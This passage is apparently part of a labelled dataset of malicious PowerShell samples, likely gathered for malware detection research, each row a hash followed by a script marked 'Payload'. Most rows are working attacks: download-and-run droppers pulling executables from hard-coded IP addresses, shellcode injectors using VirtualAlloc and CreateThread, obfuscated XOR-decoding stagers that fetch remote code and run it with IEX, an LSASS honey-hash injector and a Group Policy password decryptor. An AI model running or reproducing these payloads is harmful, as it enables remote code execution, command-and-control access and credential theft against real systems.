{$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7f4283dd5e23d4a0a229f24ddf2ab3431a8d2a7b849db6237c213105c709ec3e,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x35,0xe9,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
8371093efe5c11e0cc089011f696f594794e0ea6a2a814c8704e9888c862a324,"Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)
	
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	
	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String("""")
	
	$var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int32]))).Invoke($var_hthread,0xffffffff) | Out-Null
}

",Payload
7686e1803b770f4d6c364d3e0197fdba8bea50d986c968cb5c1b7fc5df6ed2b4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x58,0x4d,0xdb,0xc1,0xda,0xdb,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xef,0xfc,0x03,0x57,0x57,0xaf,0x2e,0x3d,0x8f,0xad,0xd1,0xbe,0x4f,0xd2,0x58,0x5b,0x7e,0xd2,0x3f,0x2f,0xd0,0xe2,0x34,0x7d,0xdc,0x89,0x19,0x96,0x57,0xff,0xb5,0x99,0xd0,0x4a,0xe0,0x94,0xe1,0xe7,0xd0,0xb7,0x61,0xfa,0x04,0x18,0x58,0x35,0x59,0x59,0x9d,0x28,0x90,0x0b,0x76,0x26,0x07,0xbc,0xf3,0x72,0x94,0x37,0x4f,0x92,0x9c,0xa4,0x07,0x95,0x8d,0x7a,0x1c,0xcc,0x0d,0x7c,0xf1,0x64,0x04,0x66,0x16,0x40,0xde,0x1d,0xec,0x3e,0xe1,0xf7,0x3d,0xbe,0x4e,0x36,0xf2,0x4d,0x8e,0x7e,0x34,0xae,0xe5,0x76,0x47,0x53,0xfe,0x4c,0x3a,0x8f,0x8b,0x56,0x9c,0x44,0x2b,0xb3,0x1d,0x88,0xaa,0x30,0x11,0x65,0xb8,0x1f,0x35,0x78,0x6d,0x14,0x41,0xf1,0x90,0xfb,0xc0,0x41,0xb7,0xdf,0x89,0x12,0xd6,0x46,0x77,0xf4,0xe7,0x99,0xd8,0xa9,0x4d,0xd1,0xf4,0xbe,0xff,0xb8,0x90,0x73,0x32,0x43,0x60,0x1c,0x45,0x30,0x52,0x83,0xfd,0xde,0xde,0x4c,0xd8,0x19,0x21,0x67,0x9c,0xb6,0xdc,0x88,0xdd,0x9f,0x1a,0xdc,0x8d,0xb7,0x8b,0x5d,0x46,0x48,0x34,0x88,0xc9,0x18,0x9a,0x63,0xaa,0xc8,0x5a,0xd4,0x42,0x03,0x55,0x0b,0x72,0x2c,0xbc,0x24,0x19,0xd6,0x56,0x8b,0x76,0xd9,0xa5,0x63,0x85,0xda,0xb8,0x2f,0x00,0x3c,0xd0,0xdf,0x44,0x96,0x4c,0x79,0xcd,0x6c,0xed,0x86,0xdb,0x08,0x2d,0x0c,0xe8,0xed,0xe3,0xe5,0x85,0xfd,0x93,0x05,0xd0,0x5c,0x35,0x19,0xce,0xcb,0xb9,0x8f,0xf5,0x5d,0xee,0x27,0xf4,0xb8,0xd8,0xe7,0x07,0xef,0x53,0x21,0x92,0x50,0x0b,0x4e,0x72,0x51,0xcb,0x18,0x18,0x51,0xa3,0xfc,0x78,0x02,0xd6,0x02,0x55,0x36,0x4b,0x97,0x56,0x6f,0x38,0x30,0x3f,0x8d,0x67,0x76,0xe0,0x6e,0x42,0x86,0xdc,0xb8,0xaa,0xfc,0x0c,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
a524d69e81ce7e397fef57c1146f101367d74a87b9f842990d08562f4c1ced1f,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0x8e,0x65,0xac,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5dda3e5a384be9eaea8225928bfd1b3109bd20217efb8f4fde47ddb0926d0a01,"
$WC=New-OBjeCT SYstEm.NET.WEBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDers.ADd('User-Agent',$u);$Wc.PrOXY = [SyStEm.NET.WEbREqUest]::DEfaULTWEbPROxy;$WC.PROXy.CreDentIals = [SysTeM.NET.CREDeNtiaLCAche]::DefAultNetwORKCREdEntIals;$K='(y7lo.W}N;nizFQ$6-DqK3H>L1Gheg]S';$i=0;[ChAR[]]$b=([chAr[]]($Wc.DOwNlOADStrING(""http://10.0.1.37:8080/index.asp"")))|%{$_-bXOr$k[$I++%$k.LEngtH]};IEX ($b-jOiN'')

",Payload
f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c8efe9ea75325d965681babd0e363a5f874b98c2462ca9885b6d82145c5ab686,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/zap/manage/may2.exe', $dpl);Start-Process $dpl

",Payload
f1108940a603376680bf416083adab03e62cd20b92e2910d159e434615f4f185,"
$l8g4 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $l8g4 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x6c,0xcc,0x9b,0x7f,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x53,0x13,0x03,0x53,0x13,0x83,0xeb,0x90,0x2e,0x6e,0x83,0x80,0x2d,0x91,0x7c,0x50,0x52,0x1b,0x99,0x61,0x52,0x7f,0xe9,0xd1,0x62,0x0b,0xbf,0xdd,0x09,0x59,0x54,0x56,0x7f,0x76,0x5b,0xdf,0xca,0xa0,0x52,0xe0,0x67,0x90,0xf5,0x62,0x7a,0xc5,0xd5,0x5b,0xb5,0x18,0x17,0x9c,0xa8,0xd1,0x45,0x75,0xa6,0x44,0x7a,0xf2,0xf2,0x54,0xf1,0x48,0x12,0xdd,0xe6,0x18,0x15,0xcc,0xb8,0x13,0x4c,0xce,0x3b,0xf0,0xe4,0x47,0x24,0x15,0xc0,0x1e,0xdf,0xed,0xbe,0xa0,0x09,0x3c,0x3e,0x0e,0x74,0xf1,0xcd,0x4e,0xb0,0x35,0x2e,0x25,0xc8,0x46,0xd3,0x3e,0x0f,0x35,0x0f,0xca,0x94,0x9d,0xc4,0x6c,0x71,0x1c,0x08,0xea,0xf2,0x12,0xe5,0x78,0x5c,0x36,0xf8,0xad,0xd6,0x42,0x71,0x50,0x39,0xc3,0xc1,0x77,0x9d,0x88,0x92,0x16,0x84,0x74,0x74,0x26,0xd6,0xd7,0x29,0x82,0x9c,0xf5,0x3e,0xbf,0xfe,0x91,0xf3,0xf2,0x00,0x61,0x9c,0x85,0x73,0x53,0x03,0x3e,0x1c,0xdf,0xcc,0x98,0xdb,0x20,0xe7,0x5d,0x73,0xdf,0x08,0x9e,0x5d,0x1b,0x5c,0xce,0xf5,0x8a,0xdd,0x85,0x05,0x33,0x08,0x33,0x03,0xa3,0x8d,0xa9,0x06,0x7e,0x9a,0x33,0x19,0x91,0x01,0xbd,0xff,0xc1,0xe5,0xed,0xaf,0xa1,0x55,0x4e,0x00,0x49,0xbc,0x41,0x7f,0x69,0xbf,0x8b,0xe8,0x03,0x50,0x62,0x40,0xbb,0xc9,0x2f,0x1a,0x5a,0x15,0xfa,0x66,0x5c,0x9d,0x09,0x96,0x12,0x56,0x67,0x84,0xc2,0x96,0x32,0xf6,0x44,0xa8,0xe8,0x9d,0x68,0x3c,0x17,0x34,0x3f,0xa8,0x15,0x61,0x77,0x77,0xe5,0x44,0x0c,0xbe,0x73,0x27,0x7a,0xbf,0x93,0xa7,0x7a,0xe9,0xf9,0xa7,0x12,0x4d,0x5a,0xf4,0x07,0x92,0x77,0x68,0x94,0x07,0x78,0xd9,0x49,0x8f,0x10,0xe7,0xb4,0xe7,0xbe,0x18,0x93,0xf9,0x83,0xce,0xdd,0x8f,0xed,0xd2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pQ3J=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pQ3J.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pQ3J,0,0,0);for (;;){Start-sleep 60};

",Payload
0419808ae4ff46037840be69ee1b0de8e29932435d797a53fbd768be2facbf28,"
$wC=NEW-ObJect SYstEM.NeT.WEbCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADERS.ADD('User-Agent',$u);$wC.PROxy = [SySteM.Net.WebReQuEst]::DefauLtWEBPRoXy;$wC.PROXY.CrEDEnTIaLs = [SYStEm.Net.CREDENtiAlCAChe]::DefAulTNeTworkCReDenTIAls;$K='v{Z.|CFdVN)MA2PHEIe>c}:k?D

",Payload
cebd4f1f0a9a255da50aba869e1ca0b91620fdf06c8c7f6e38fb5b5a67ce9367,"function New-HoneyHash {

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Username,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    $PSPassword = $Password | ConvertTo-SecureString -asPlainText -Force

    $SystemModule = [Microsoft.Win32.IntranetZoneCredentialPolicy].Module
    $NativeMethods = $SystemModule.GetType('Microsoft.Win32.NativeMethods')
    $SafeNativeMethods = $SystemModule.GetType('Microsoft.Win32.SafeNativeMethods')
    $CreateProcessWithLogonW = $NativeMethods.GetMethod('CreateProcessWithLogonW', [Reflection.BindingFlags] 'NonPublic, Static')
    $LogonFlags = $NativeMethods.GetNestedType('LogonFlags', [Reflection.BindingFlags] 'NonPublic')
    $StartupInfo = $NativeMethods.GetNestedType('STARTUPINFO', [Reflection.BindingFlags] 'NonPublic')
    $ProcessInformation = $SafeNativeMethods.GetNestedType('PROCESS_INFORMATION', [Reflection.BindingFlags] 'NonPublic')

    $Flags = [Activator]::CreateInstance($LogonFlags)
    $Flags.value__ = 2 
    $StartInfo = [Activator]::CreateInstance($StartupInfo)
    $ProcInfo = [Activator]::CreateInstance($ProcessInformation)

    $Credential = New-Object System.Management.Automation.PSCredential(""$($Domain)\\$($UserName)"",$PSPassword)

    $PasswordPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($Credential.Password)
    $StrBuilder = New-Object System.Text.StringBuilder
    $null = $StrBuilder.Append('cmd.exe')

    $Result = $CreateProcessWithLogonW.Invoke($null, @([String] $UserName,
                                             [String] $Domain,
                                             [IntPtr] $PasswordPtr,
                                             ($Flags -as $LogonFlags),     
                                             $null,
                                             [Text.StringBuilder] $StrBuilder,
                                             0x08000000, 
                                             $null,
                                             $null,
                                             $StartInfo,
                                             $ProcInfo))

    if (-not $Result) {
        throw 'Unable to create process as user.'
    }

    if ($ProcInfo.dwProcessId) {
        
        Stop-Process -Id $ProcInfo.dwProcessId
    }

    '""Honey hash"" injected into LSASS successfully! Use Mimikatz to confirm.'
}",Payload
693340330939760a1d406029d917b95d397efdf61171e7ac7379b47d1a371d9c,"
$WC=NEw-ObjEcT SYSTeM.NET.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeAdERs.AdD('User-Agent',$u);$Wc.ProxY = [SYstem.NEt.WebREQUeST]::DEFAuLtWeBPROXy;$Wc.ProxY.CredEntiALS = [SYSTEM.NET.CRedENTialCacHe]::DefaULtNETwORKCredentialS;$K='827ccb0eea8a706c4c34a16891f84e7b';$i=0;[CHar[]]$B=([ChaR[]]($wc.DOwnloadStRiNg(""http://192.168.2.106:8080/index.asp"")))|%{$_-bXOr$K[$I++%$k.LEnGTH]};IEX ($B-jOIN'')

",Payload
9385815f7cace3eef5c09f4e45a13800257edd3d06007dd81a47883a7f450de5,"

$text = 'Hello World bbb'
$text | Out-File ""$env:userprofile\\Desktop\\bbb.txt""


",Payload
73b384e76fd99f579ef3617ea67e2d312499888a4f03bd068f0ab946337b0920,"
$WC=NEW-OBjECT SySteM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEaDeRs.Add('User-Agent',$u);$Wc.ProxY = [SYstem.Net.WEbREqUESt]::DefaUlTWeBPrOXy;$wc.PRoxy.CRedeNtiAls = [SySteM.NET.CReDEntiALCaChe]::DEFaULTNETwoRkCREDEnTiaLS;$K='0qoga`PzyB\\pse]{_iO.G*Dd>uN=x?:S';$i=0;[CHAr[]]$B=([ChAR[]]($wc.DownloaDStrInG(""https://46.101.90.248:443/index.asp"")))|%{$_-BXOr$k[$I++%$K.LengTh]};IEX ($b-joiN'')

",Payload
cc70cdc4ef8f413f3d5628013ede46311b771ec98c42134f31e19b2e2f6c9fe2,"function Get-GPPPasswordMod
{

    [CmdletBinding(DefaultParametersetName=""Default"")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage=""Credentials to use when connecting to a Domain Controller."")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage=""Domain controller for Domain and Site that you want to query against."")]
        [string]$DomainController
    )

    Begin
    {

        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        
        
        
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  

        
        
        
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
